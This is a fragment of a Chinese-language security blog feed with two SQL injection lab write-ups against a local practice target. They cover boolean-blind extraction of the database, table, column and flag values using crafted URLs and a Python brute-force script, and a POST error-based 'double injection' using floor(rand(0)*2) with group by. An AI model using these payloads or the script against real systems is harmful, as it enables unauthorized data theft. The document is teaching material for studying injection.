&lt;p&gt;小练习：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#尝试报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;①http://127.0.0.1/SQLC/sql-3.php/?id=1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;②http://127.0.0.1/SQLC/sql-3.php/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;传入的值:id=1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SELECT * FROM users WHERE id=(1) LIMIT 0,1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Username: kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Password: Kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id=1&amp;#x27;查询失败&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#闭合符号，尝试不报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;传入的值:id=1) #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SELECT * FROM users WHERE id=(1) #) LIMIT 0,1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Username: kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Password: Kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#布尔盲注&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#1.构造布尔值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and 1 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Username: kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Password: Kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#2.Burp爆破数据库长度&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and length(database())=9 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#3.Burp爆破数据库名字&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr(database(),1,1))=20) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1-99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2-104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3-97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4-108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5-108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6-101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7-110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8-103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9-101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;database()=challenge&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#4.爆破表名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=20) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1-101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2-109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3-97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4-105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5-108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6-115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;第一个表名emails&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=ord(&amp;#x27;%s&amp;#x27;)) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=20) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1-102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2-108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3-97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4-103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;第二个表名flag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#5.爆破表中的列&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and tabel_name=&amp;#x27;flag&amp;#x27; limit 1,1),1,1))=20) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;爆破脚本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and tabel_name=&amp;#x27;flag&amp;#x27; limit 0,1),%d,1))=ord(&amp;#x27;%s&amp;#x27;)) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#6.爆破值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select value from challeng.flag where flag=&amp;#x27;flag3&amp;#x27; limit 1,1),1,1))=20) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1-103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2-105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3-114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gir&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;【附】爆破脚本&#34;&gt;&lt;a href=&#34;#【附】爆破脚本&#34; class=&#34;headerlink&#34; title=&#34;【附】爆破脚本&#34;&gt;&lt;/a&gt;【附】爆破脚本&lt;/h5&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;target_name&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	name = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=ord(&amp;#x27;%s&amp;#x27;))&amp;quot;&lt;/span&gt; %(j,i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(url+&lt;span class=&#34;string&#34;&gt;&amp;#x27;%23&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			r = requests.get(url+&lt;span class=&#34;string&#34;&gt;&amp;#x27;%23&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;Username: kevin&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; r.text:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				name = name+i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;FINAL target_name:&amp;#x27;&lt;/span&gt;,name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target_name()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;脚本爆破数据库名&#34;&gt;&lt;a href=&#34;#脚本爆破数据库名&#34; class=&#34;headerlink&#34; title=&#34;脚本爆破数据库名&#34;&gt;&lt;/a&gt;脚本爆破数据库名&lt;/h5&gt;&lt;p&gt;url为：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr(database(),%d,1))=ord(&amp;#x27;%s&amp;#x27;))&amp;quot;&lt;/span&gt; %(j,i)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001120214845.png&#34; alt=&#34;image-20221001120214845&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;脚本爆破表名&#34;&gt;&lt;a href=&#34;#脚本爆破表名&#34; class=&#34;headerlink&#34; title=&#34;脚本爆破表名&#34;&gt;&lt;/a&gt;脚本爆破表名&lt;/h5&gt;&lt;p&gt;修改url为：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;url = &amp;quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=ord(&amp;#x27;%s&amp;#x27;))&amp;quot; %(j,i)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆出第一个表名&lt;code&gt;emails&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001115314470.png&#34; alt=&#34;image-20221001115314470&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改&lt;code&gt;limit 1,1&lt;/code&gt;爆出第二个表名&lt;code&gt;flag&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001115353280.png&#34; alt=&#34;image-20221001115353280&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;脚本爆破列名&#34;&gt;&lt;a href=&#34;#脚本爆破列名&#34; class=&#34;headerlink&#34; title=&#34;脚本爆破列名&#34;&gt;&lt;/a&gt;脚本爆破列名&lt;/h5&gt;&lt;p&gt;修改url为：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&amp;#x27;flag&amp;#x27; limit 0,1),%d,1))=ord(&amp;#x27;%s&amp;#x27;))&amp;quot;&lt;/span&gt; %(j,i)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆出第一个列名&lt;code&gt;flag&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001114442930.png&#34; alt=&#34;image-20221001114442930&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改&lt;code&gt;limit 1,1&lt;/code&gt;爆出第二个列名&lt;code&gt;value&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001114318316.png&#34; alt=&#34;image-20221001114318316&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;脚本爆破值&#34;&gt;&lt;a href=&#34;#脚本爆破值&#34; class=&#34;headerlink&#34; title=&#34;脚本爆破值&#34;&gt;&lt;/a&gt;脚本爆破值&lt;/h5&gt;&lt;p&gt;修改url为：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select value from challenge.flag where flag=&amp;#x27;flag3&amp;#x27;),%d,1))=ord(&amp;#x27;%s&amp;#x27;))&amp;quot;&lt;/span&gt; %(j,i)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆出当&lt;code&gt;flag=flag3&lt;/code&gt;时的&lt;code&gt;value&lt;/code&gt;值为&lt;code&gt;gir&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001115921853.png&#34; alt=&#34;image-20221001115921853&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%8F%8C%E6%B3%A8%E5%85%A5/</guid>
            <title>双注入</title>
            <link>https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%8F%8C%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入探究</category>
            <pubDate>Sat, 01 Oct 2022 00:08:18 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL-注入之双注入&#34;&gt;&lt;a href=&#34;#SQL-注入之双注入&#34; class=&#34;headerlink&#34; title=&#34;SQL 注入之双注入&#34;&gt;&lt;/a&gt;SQL 注入之双注入&lt;/h1&gt;&lt;p&gt;本篇使用双注入。&lt;/p&gt;
&lt;h2 id=&#34;注入步骤&#34;&gt;&lt;a href=&#34;#注入步骤&#34; class=&#34;headerlink&#34; title=&#34;注入步骤&#34;&gt;&lt;/a&gt;注入步骤&lt;/h2&gt;&lt;h3 id=&#34;设置代理&#34;&gt;&lt;a href=&#34;#设置代理&#34; class=&#34;headerlink&#34; title=&#34;设置代理&#34;&gt;&lt;/a&gt;设置代理&lt;/h3&gt;&lt;p&gt;还是Less-11，我们挂上&lt;strong&gt;BurpSuit&lt;/strong&gt;代理，然后&lt;strong&gt;Send To Reapeater&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930220638714.png&#34; alt=&#34;image-20220930220638714&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;确定注入类型和列数&#34;&gt;&lt;a href=&#34;#确定注入类型和列数&#34; class=&#34;headerlink&#34; title=&#34;确定注入类型和列数&#34;&gt;&lt;/a&gt;确定注入类型和列数&lt;/h3&gt;&lt;p&gt;我们输入1 + 单引号。 &lt;strong&gt;不报错&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930221056886.png&#34; alt=&#34;image-20220930221056886&#34;&gt;&lt;/p&gt;
&lt;p&gt;输入1 + 单引号 + %23&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27;&amp;quot; %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;报错，&lt;code&gt;&amp;quot; #&amp;#39; and password=&amp;#39;123456&amp;#39; LIMIT 0,1&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;由#号后面跟着个单引号，这就说明第一个&lt;strong&gt;username是使用单引号闭合的&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930221013645.png&#34; alt=&#34;image-20220930221013645&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用order by n确定列数&lt;/p&gt;
&lt;p&gt;输入2，不报错&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; order by 2 %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930221434509.png&#34; alt=&#34;image-20220930221434509&#34;&gt;&lt;/p&gt;
&lt;p&gt;输入3，报错&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; order by 3 %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930221557671.png&#34; alt=&#34;image-20220930221557671&#34;&gt;&lt;/p&gt;
&lt;p&gt;综上，注入类型是&lt;strong&gt;POST型单引号注入&lt;/strong&gt;，且&lt;strong&gt;查询列数为2&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;采用双注入时，我们需要使用到以下函数：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;group by 函数：在对数据进行分组时会先看虚拟表中是否存在这个值，不存在就插入；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;floor()函数：MySQL的一个数学函数。此函数用于查找等于或小于给定数字的最大整数。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Select floor(11.2); ----&amp;gt;返回11（注意，只返回11，因为11是小于11.2的最大整数）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+----------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   floor(11.2)  |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+----------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|           11   |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+----------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rand()函数：获取随机的浮点数（小于0的小数），而 rand(0) 则是获取固定的小数值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;举例说明：select rand() from qs_ad_category;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;结果为随机的浮点型小数：0.7450851357961866&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;floor() 函数 配合 rand() 函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;由于rand()函数是获取小于1 的浮点数，也就是例如上述结果中的0.7450851357961866&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;而floor()函数是将括号中的值取整，以小于括号中值的最大整数作为结果展示出来。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;例如上述rand()的结果为 0.7450851357961866，那么最大整数就是 “0” 所以 ：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select floor(rand(0)) from qs_ad_category 的 结果值 为 “0” 。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;若是rand()*2,则 rand() 结果可能会大于 1 ，那么结合 floor()函数 ——最终的值可能为0，可能为1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;count() 函数：计数函数，用来计算数据总和的函数，该函数结果集只有一个。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;count(1)：统计不为NULL 的记录。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;count(*)：统计所有的记录（包括NULL）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;count(字段)：统计该&amp;quot;字段&amp;quot;不为NULL 的记录。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;count(DISTINCT 字段)：统计该&amp;quot;字段&amp;quot;去重且不为NULL 的记录。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;如果三者一起使用:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select 1,count(1) from information_schema.tables group by floor(rand(0)*2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;意思是，floor(rand(0)*2)这个值存在的话 count()加1，若虛表不存在记录，插入虚表时会把floor(rand(0)*2)再执行一次（注意是一次，很重要！！！）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用group by floor(rand() *2)&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1,2 from information_schema.tables group by floor(rand()*2) %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930223216903.png&#34; alt=&#34;image-20220930223216903&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到，uname 和 password位都被select的内容（1和2）代替。&lt;/p&gt;
&lt;p&gt;下面探究group by、rand()、count()的组合使用的关系。&lt;/p&gt;
&lt;h3 id=&#34;灵魂拷问一：rand-和rand-0-有什么区别&#34;&gt;&lt;a href=&#34;#灵魂拷问一：rand-和rand-0-有什么区别&#34; class=&#34;headerlink&#34; title=&#34;灵魂拷问一：rand()和rand(0)有什么区别?&#34;&gt;&lt;/a&gt;灵魂拷问一：rand()和rand(0)有什么区别?&lt;/h3&gt;&lt;p&gt;使用&lt;code&gt;rand() *2&lt;/code&gt;，&lt;code&gt;第一次&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930225234750.png&#34; alt=&#34;image-20220930225234750&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;rand() *2&lt;/code&gt;，&lt;code&gt;第二次&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930225215910.png&#34; alt=&#34;image-20220930225215910&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;rand() *2&lt;/code&gt;，&lt;code&gt;第三次&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930225250214.png&#34; alt=&#34;image-20220930225250214&#34;&gt;&lt;/p&gt;
&lt;p&gt;综合以上三次使用rand()*2的情况，我们发现结果毫无规律，是真正的随机。&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;rand(0) *2&lt;/code&gt;，&lt;code&gt;第一次&lt;/code&gt;、&lt;code&gt;第二次&lt;/code&gt;、&lt;code&gt;第三次&lt;/code&gt;都是下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930225429894.png&#34; alt=&#34;image-20220930225429894&#34;&gt;&lt;/p&gt;
&lt;p&gt;结果说明，使用rand(0)*2可以做到一种伪随机变化，会一直保持011 011 011这样的规律。&lt;/p&gt;
&lt;h3 id=&#34;灵魂拷问二：为什么select-1-count-1-from-xxx-group-by-floor-rand-0-2-会报错？&#34;&gt;&lt;a href=&#34;#灵魂拷问二：为什么select-1-count-1-from-xxx-group-by-floor-rand-0-2-会报错？&#34; class=&#34;headerlink&#34; title=&#34;灵魂拷问二：为什么select 1, count(1) from xxx group by floor(rand(0) * 2) 会报错？&#34;&gt;&lt;/a&gt;灵魂拷问二：为什么select 1, count(1) from xxx group by floor(rand(0) * 2) 会报错？&lt;/h3&gt;&lt;p&gt;我们需要知道先创建虚拟表，以下图(其中key是group by后面跟随的内容【即主键】，不可重复)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930230206868.png&#34; alt=&#34;image-20220930230206868&#34;&gt;&lt;/p&gt;
&lt;p&gt;开始查询数据，取数据库数据，而后查看虚拟表中是否存在主键，不存在则插入新记录，存在则count(1)字段直接加1，&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930230334615.png&#34; alt=&#34;image-20220930230334615&#34;&gt;&lt;/p&gt;
&lt;p&gt;由此看到 若是key存在的话就+1， 不存在的话就新建一个key。&lt;/p&gt;
&lt;p&gt;但是mysql官方有给提示，查询的时候若是使用了rand()的话，该值会被计算屡次，这个【计算屡次】是什么意思？就是在使用group by 的时候，floor(rand(0)*2)会被执行一次，若是虚表不存在这个记录，插入虚表的时候会再被执行一次。&lt;/p&gt;
